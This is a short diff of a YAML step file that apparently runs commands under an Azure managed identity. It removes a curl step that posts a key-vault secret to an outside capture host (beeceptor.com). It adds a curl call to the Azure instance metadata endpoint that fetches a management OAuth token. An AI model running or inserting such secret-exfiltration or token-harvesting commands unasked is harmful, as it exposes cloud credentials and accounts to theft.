@@ -1,7 +1,5 @@
 version: v1.1.0
-keys:
-  - id: vault2
-    keyvault: https://azurestage.vault.azure.net/keys/Skid-Carthage
 steps:
   - cmd: az login --allow-no-subscriptions --identity
-  - cmd: curl -X POST https://test-azure.free.beeceptor.com -d 'Key 1 -> {{.Keys.vault2}}'
+  - cmd: curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" -H "Metadata:true"
+
